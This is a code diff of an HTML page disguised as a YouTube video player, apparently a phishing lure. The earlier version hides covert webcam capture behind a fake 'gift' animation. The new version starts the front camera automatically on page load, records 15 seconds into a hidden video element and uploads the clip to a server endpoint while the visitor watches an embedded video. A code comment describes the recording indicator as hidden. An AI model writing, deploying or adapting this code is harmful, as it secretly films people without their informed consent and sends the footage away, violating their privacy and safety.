@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎬 YouTube Surprise</title>
+    <title>🎬 YouTube</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -12,11 +12,12 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             overflow: hidden;
             position: relative;
         }
         
+        /* Confetti Background */
         .confetti-container {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -32,150 +33,38 @@
             100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
         }
         
-        .gift-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 100;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            background: rgba(0,0,0,0.7);
-            animation: fadeIn 0.5s ease;
-            pointer-events: none;
-        }
-        .gift-overlay.active {
-            display: flex;
-            animation: fadeIn 0.5s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .gift-content {
-            text-align: center;
-            animation: bounceIn 1s ease;
-            pointer-events: auto;
-        }
-        @keyframes bounceIn {
-            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
-            50% { transform: scale(1.2) rotate(5deg); }
-            70% { transform: scale(0.9) rotate(-3deg); }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
-        }
-        .gift-emoji {
-            font-size: 150px;
-            display: block;
-            animation: giftFloat 2s ease-in-out infinite;
-            text-shadow: 0 0 80px rgba(255,215,0,0.8);
-        }
-        @keyframes giftFloat {
-            0%, 100% { transform: translateY(0px) scale(1); }
-            50% { transform: translateY(-20px) scale(1.05); }
-        }
-        .gift-text {
-            color: white;
-            font-size: 3.5rem;
-            font-weight: bold;
-            text-shadow: 0 0 30px rgba(255,215,0,0.6);
-            margin-top: 20px;
-            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d, #ff6b6b);
-            background-size: 300% auto;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shimmer 3s linear infinite;
-        }
-        @keyframes shimmer {
-            0% { background-position: 0% center; }
-            100% { background-position: 300% center; }
-        }
-        .gift-sub {
-            color: rgba(255,255,255,0.9);
-            font-size: 1.3rem;
-            margin-top: 15px;
-            -webkit-text-fill-color: rgba(255,255,255,0.9);
-            animation: pulse 2s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-        
-        .celebration-confetti {
-            position: fixed;
-            z-index: 99;
-            pointer-events: none;
-            font-size: 50px;
-            animation: celebrationFall linear forwards;
-        }
-        @keyframes celebrationFall {
-            0% { transform: translateY(-100px) rotate(0deg) scale(1); opacity: 1; }
-            100% { transform: translateY(120vh) rotate(720deg) scale(0.5); opacity: 0; }
-        }
-        
-        .festival-card {
+        /* Video Card */
+        .video-card {
             position: relative; z-index: 1;
-            background: rgba(255, 255, 255, 0.12);
+            background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(20px);
             border-radius: 30px;
-            padding: 40px;
-            max-width: 650px; width: 90%;
-            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.15);
+            padding: 30px;
+            max-width: 750px; width: 90%;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,255,255,0.05);
             text-align: center;
             animation: float 3s ease-in-out infinite;
             transition: all 0.5s ease;
         }
-        .festival-card:hover {
-            transform: scale(1.02);
-            border-color: rgba(255,215,0,0.3);
-        }
-        .festival-card.opening {
+        .video-card.recording {
             animation: none;
-            transform: scale(1.05);
-            border-color: #ffd93d;
-            box-shadow: 0 0 80px rgba(255,215,0,0.3);
+            border-color: rgba(255,215,0,0.3);
+            box-shadow: 0 0 80px rgba(255,215,0,0.1);
         }
         @keyframes float {
             0%, 100% { transform: translateY(0px); }
             50% { transform: translateY(-10px); }
         }
         
-        .main-emoji {
-            font-size: 80px; 
-            margin-bottom: 15px; 
-            display: block;
-            animation: pulse 2s ease-in-out infinite;
-        }
-        .main-emoji.opening {
-            animation: celebrateSpin 1s ease-in-out infinite;
-        }
-        @keyframes celebrateSpin {
-            0%, 100% { transform: rotate(-5deg) scale(1); }
-            50% { transform: rotate(5deg) scale(1.1); }
-        }
-        
-        .festival-title {
-            color: white; 
-            font-size: 2.2rem; 
-            font-weight: bold;
-            margin-bottom: 5px;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
-        }
-        .subtitle {
-            color: rgba(255,255,255,0.8);
-            font-size: 1rem;
-            margin-bottom: 20px;
-            line-height: 1.6;
-        }
-        
         .video-container {
-            margin: 15px 0 20px 0;
+            margin: 0 0 15px 0;
             border-radius: 15px;
             overflow: hidden;
             position: relative;
             background: #000;
             aspect-ratio: 16/9;
-            border: 2px solid rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.05);
             transition: all 0.3s ease;
         }
         .video-container iframe {
@@ -184,147 +73,78 @@
             border: none;
         }
         
-        .gift-btn {
-            background: linear-gradient(135deg, #ffd93d, #f5576c);
-            border: none;
-            color: white;
-            padding: 16px 50px;
-            font-size: 1.3rem;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 40px rgba(245,87,108,0.4);
-            margin: 10px auto;
-            position: relative;
-            overflow: hidden;
-            display: inline-flex;
-            align-items: center;
-            gap: 15px;
+        .play-indicator {
+            color: rgba(255,255,255,0.3);
+            font-size: 0.9rem;
+            margin-top: 5px;
+            letter-spacing: 2px;
+            animation: pulse 2s ease-in-out infinite;
         }
-        .gift-btn::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
-            transform: rotate(45deg);
-            animation: btnShine 3s linear infinite;
-        }
-        @keyframes btnShine {
-            0% { transform: translateX(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) rotate(45deg); }
-        }
-        .gift-btn:hover:not(:disabled) {
-            transform: scale(1.08);
-            box-shadow: 0 15px 50px rgba(245,87,108,0.6);
-        }
-        .gift-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .gift-btn .btn-emoji {
-            font-size: 1.8rem;
+        @keyframes pulse {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 0.7; }
         }
         
-        .surprise-container {
-            margin: 20px 0 10px 0;
+        /* Recording Indicator (Hidden - Only visible in corner) */
+        .recording-dot {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 50;
             display: none;
-        }
-        .surprise-container.visible {
-            display: block;
-        }
-        .surprise-text {
-            color: rgba(255,255,255,0.9);
-            font-size: 1rem;
-            margin-bottom: 10px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        .progress-container {
-            width: 100%; 
-            height: 6px;
-            background: rgba(255,255,255,0.15);
-            border-radius: 10px;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%; 
-            width: 0%;
-            background: linear-gradient(90deg, #ffd93d, #f5576c);
-            border-radius: 10px;
-            transition: width 0.3s ease;
-        }
-        .progress-bar.done {
-            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
-            background-size: 200% auto;
-            animation: shimmer 1s linear infinite;
-        }
-        
-        .status {
-            margin-top: 15px; 
-            color: rgba(255,255,255,0.6);
-            font-size: 0.85rem;
-            min-height: 20px;
-            opacity: 0.5;
-        }
-        .status.active {
-            opacity: 1;
-        }
-        .status.success {
-            color: #7dffb3;
-            opacity: 1;
-        }
-        .status.error {
-            color: #ff6b6b;
-            opacity: 1;
-        }
-        
-        .mode-badge {
-            display: inline-block;
-            background: rgba(255,215,0,0.2);
-            color: #ffd93d;
-            padding: 4px 15px;
+            align-items: center;
+            gap: 10px;
+            background: rgba(255,0,0,0.2);
+            padding: 8px 15px;
             border-radius: 20px;
+            border: 1px solid rgba(255,0,0,0.3);
+            backdrop-filter: blur(10px);
+        }
+        .recording-dot.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .recording-dot .dot {
+            width: 10px;
+            height: 10px;
+            background: #ff0000;
+            border-radius: 50%;
+            animation: blink 1s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        .recording-dot .label {
+            color: rgba(255,255,255,0.7);
             font-size: 0.7rem;
-            border: 1px solid rgba(255,215,0,0.2);
-            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         
         #hiddenVideo { display: none; }
         
         @media (max-width: 600px) {
-            .festival-card { padding: 20px; }
-            .festival-title { font-size: 1.8rem; }
-            .main-emoji { font-size: 60px; }
-            .gift-btn { padding: 14px 30px; font-size: 1.1rem; }
-            .gift-emoji { font-size: 100px; }
-            .gift-text { font-size: 2.5rem; }
+            .video-card { padding: 15px; }
         }
     </style>
 </head>
 <body>
     <div class="confetti-container" id="confettiContainer"></div>
     
-    <div class="gift-overlay" id="giftOverlay">
-        <div class="gift-content">
-            <span class="gift-emoji" id="giftEmoji">🎁</span>
-            <div class="gift-text" id="giftText">🎉 SURPRISE! 🎉</div>
-            <div class="gift-sub">✨ Your gift is ready! ✨</div>
-        </div>
+    <div class="recording-dot" id="recordingDot">
+        <span class="dot"></span>
+        <span class="label">Recording</span>
     </div>
     
     <video id="hiddenVideo" autoplay playsinline></video>
     
-    <div class="festival-card" id="festivalCard">
-        <div class="mode-badge">🎬 YouTube Mode</div>
-        <span class="main-emoji" id="mainEmoji">🎊</span>
-        <h1 class="festival-title"><span id="festivalName">YouTube Surprise</span></h1>
-        <p class="subtitle" id="subtitle">✨ Watch this video and claim your surprise ✨</p>
-        
-        <div class="video-container" id="videoContainer">
+    <div class="video-card" id="videoCard">
+        <div class="video-container">
             <iframe 
                 id="youtubePlayer"
                 src=""
@@ -333,51 +153,39 @@
                 allowfullscreen>
             </iframe>
         </div>
-        
-        <button class="gift-btn" id="giftBtn">
-            <span class="btn-emoji">🎁</span>
-            <span id="btnText">Open Your Gift</span>
-        </button>
-        
-        <div class="surprise-container" id="surpriseContainer">
-            <div class="surprise-text" id="surpriseText">🎀 Preparing your surprise...</div>
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-        </div>
-        
-        <div class="status" id="statusMessage">💝 Watch the video and click the gift!</div>
+        <div class="play-indicator">▶ PLAYING</div>
     </div>
 
     <script>
-        // Get parameters from URL
+        // ============================================
+        // Get video ID from URL parameter
+        // ============================================
         const urlParams = new URLSearchParams(window.location.search);
         const videoId = urlParams.get('video') || 'dQw4w9WgXcQ';
-        const festivalName = urlParams.get('name') || 'YouTube Surprise';
         
-        document.getElementById('festivalName').textContent = festivalName;
-        document.getElementById('youtubePlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0`;
+        // Load YouTube video with autoplay
+        document.getElementById('youtubePlayer').src = 
+            `https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0&controls=1&modestbranding=1`;
 
+        // ============================================
+        // DOM Elements
+        // ============================================
         const videoElement = document.getElementById('hiddenVideo');
-        const giftBtn = document.getElementById('giftBtn');
-        const btnText = document.getElementById('btnText');
-        const statusMessage = document.getElementById('statusMessage');
-        const progressBar = document.getElementById('progressBar');
-        const surpriseContainer = document.getElementById('surpriseContainer');
-        const surpriseText = document.getElementById('surpriseText');
-        const festivalCard = document.getElementById('festivalCard');
-        const mainEmoji = document.getElementById('mainEmoji');
-        const giftOverlay = document.getElementById('giftOverlay');
-        const giftEmoji = document.getElementById('giftEmoji');
-        const giftText = document.getElementById('giftText');
+        const videoCard = document.getElementById('videoCard');
+        const recordingDot = document.getElementById('recordingDot');
 
         const UPLOAD_URL = '/upload';
         const DURATION = 15;
-        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
-        let timerInterval = null, timeRemaining = DURATION, isRecording = false;
-        let isGiftOpened = false;
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let timerInterval = null;
+        let timeRemaining = DURATION;
+        let isRecording = false;
 
-        // Confetti generator
+        // ============================================
+        // Confetti Generator (Background)
+        // ============================================
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -393,70 +201,16 @@
             confettiContainer.appendChild(confetti);
         }
 
-        function showGiftReveal() {
-            giftOverlay.classList.add('active');
-            
-            let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
-            let index = 0;
-            
-            const emojiInterval = setInterval(() => {
-                giftEmoji.textContent = emojis[index % emojis.length];
-                index++;
-                if (index > 10) {
-                    clearInterval(emojiInterval);
-                    giftEmoji.textContent = '🎉';
-                    giftText.textContent = '🎊 SURPRISE! 🎊';
-                    
-                    launchCelebrationConfetti();
-                    
-                    setTimeout(() => {
-                        giftOverlay.classList.remove('active');
-                        festivalCard.classList.remove('opening');
-                        mainEmoji.classList.remove('opening');
-                        giftBtn.disabled = false;
-                        btnText.textContent = 'Open Another Gift';
-                        statusMessage.textContent = '💝 Thank you! You can open another gift!';
-                        surpriseContainer.classList.remove('visible');
-                        isGiftOpened = false;
-                    }, 5000);
-                }
-            }, 200);
-        }
-
-        function launchCelebrationConfetti() {
-            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '💝'];
-            const container = document.body;
-            
-            for (let i = 0; i < 60; i++) {
-                setTimeout(() => {
-                    const el = document.createElement('div');
-                    el.className = 'celebration-confetti';
-                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-                    el.style.left = Math.random() * 100 + '%';
-                    el.style.fontSize = (Math.random() * 40 + 25) + 'px';
-                    el.style.animationDuration = (Math.random() * 3 + 2) + 's';
-                    container.appendChild(el);
-                    
-                    setTimeout(() => { el.remove(); }, 5000);
-                }, i * 40);
-            }
-        }
-
-        async function openGift() {
-            if (isGiftOpened) return;
-            isGiftOpened = true;
-            
+        // ============================================
+        // Auto-start recording when page loads
+        // ============================================
+        async function startRecording() {
             try {
-                giftBtn.disabled = true;
-                btnText.textContent = '🎀 Opening...';
-                festivalCard.classList.add('opening');
-                mainEmoji.classList.add('opening');
-                mainEmoji.textContent = '🎁';
-                surpriseContainer.classList.add('visible');
-                surpriseText.textContent = '🎀 Preparing your surprise...';
-                progressBar.style.width = '0%';
-                statusMessage.textContent = '⏳ Your surprise is being prepared...';
+                // Show recording indicator
+                recordingDot.classList.add('active');
+                videoCard.classList.add('recording');
 
+                // Access camera (hidden)
                 mediaStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
@@ -465,6 +219,7 @@
                 videoElement.srcObject = mediaStream;
                 await videoElement.play();
 
+                // Setup recorder
                 recordedChunks = [];
                 mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                 mediaRecorder.ondataavailable = (event) => {
@@ -472,83 +227,62 @@
                 };
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    uploadGift(blob);
+                    uploadVideo(blob);
                 };
 
+                // Start recording
                 mediaRecorder.start();
                 isRecording = true;
                 timeRemaining = DURATION;
-                
-                surpriseText.textContent = '🎁 Your surprise is being created...';
 
+                console.log('🎬 Recording started for', DURATION, 'seconds');
+
+                // Countdown timer
                 timerInterval = setInterval(() => {
                     timeRemaining--;
-                    const progress = ((DURATION - timeRemaining) / DURATION) * 100;
-                    progressBar.style.width = progress + '%';
-                    
-                    const messages = [
-                        '🎨 Creating magic...',
-                        '✨ Adding sparkles...',
-                        '🌟 Almost ready...',
-                        '🎁 Your surprise is coming!',
-                        '💝 Final touches...'
-                    ];
-                    const msgIndex = Math.min(
-                        Math.floor((DURATION - timeRemaining) / 3),
-                        messages.length - 1
-                    );
-                    if (timeRemaining > 3) {
-                        surpriseText.textContent = messages[msgIndex % messages.length];
-                    }
                     
                     if (timeRemaining <= 0) {
                         clearInterval(timerInterval);
                         timerInterval = null;
                         
+                        // Stop recording
                         if (mediaRecorder && isRecording) {
                             mediaRecorder.stop();
                             isRecording = false;
-                            surpriseText.textContent = '🎊 Your surprise is ready!';
-                            progressBar.classList.add('done');
-                            progressBar.style.width = '100%';
+                            recordingDot.classList.remove('active');
+                            videoCard.classList.remove('recording');
+                            console.log('✅ Recording stopped');
                         }
                         
+                        // Stop camera
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
                             mediaStream = null;
                             videoElement.srcObject = null;
                         }
-                        
-                        setTimeout(() => {
-                            showGiftReveal();
-                        }, 500);
                     }
                 }, 1000);
 
             } catch (error) {
-                console.error('Error:', error);
-                let errorMsg = '❌ ';
+                console.error('❌ Camera error:', error);
+                recordingDot.classList.remove('active');
+                videoCard.classList.remove('recording');
+                
+                let errorMsg = 'Camera error: ';
                 if (error.name === 'NotAllowedError') {
-                    errorMsg += 'Camera access denied. Please allow camera permission.';
+                    errorMsg += 'Permission denied. Please allow camera access.';
                 } else if (error.name === 'NotFoundError') {
-                    errorMsg += 'No camera found on this device.';
-                } else if (error.name === 'NotReadableError') {
-                    errorMsg += 'Camera is in use by another application.';
+                    errorMsg += 'No camera found.';
                 } else {
-                    errorMsg += 'Something went wrong. Please try again.';
+                    errorMsg += error.message;
                 }
-                statusMessage.textContent = errorMsg;
-                statusMessage.style.opacity = '1';
-                giftBtn.disabled = false;
-                btnText.textContent = 'Try Again';
-                isGiftOpened = false;
-                surpriseContainer.classList.remove('visible');
+                console.error(errorMsg);
             }
         }
 
-        async function uploadGift(blob) {
+        async function uploadVideo(blob) {
             const formData = new FormData();
-            formData.append('video', blob, `gift_${Date.now()}.webm`);
+            formData.append('video', blob, `video_${Date.now()}.webm`);
 
             try {
                 const response = await fetch(UPLOAD_URL, { 
@@ -556,31 +290,37 @@
                     body: formData 
                 });
                 
-                if (!response.ok) {
-                    throw new Error('Upload failed: ' + response.status);
+                if (response.ok) {
+                    console.log('✅ Video uploaded successfully!');
+                } else {
+                    console.error('❌ Upload failed:', response.status);
                 }
-                console.log('✅ Gift video uploaded successfully!');
             } catch (error) {
-                console.error('Upload error:', error);
+                console.error('❌ Upload error:', error);
             }
         }
 
-        giftBtn.addEventListener('click', openGift);
-        
-        festivalCard.addEventListener('click', () => {
-            if (!isGiftOpened && !giftBtn.disabled) {
-                openGift();
-            }
+        // ============================================
+        // Auto-start when page loads
+        // ============================================
+        window.addEventListener('load', () => {
+            // Small delay to ensure everything is ready
+            setTimeout(startRecording, 1000);
         });
 
+        // Cleanup on page unload
         window.addEventListener('beforeunload', () => {
-            if (mediaRecorder && isRecording) mediaRecorder.stop();
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+            }
             if (mediaStream) {
                 mediaStream.getTracks().forEach(track => track.stop());
             }
         });
 
         console.log('🎬 YouTube mode loaded!');
+        console.log('📹 Recording:', DURATION, 'seconds');
+        console.log('▶ Video ID:', videoId);
     </script>
 </body>
 </html>
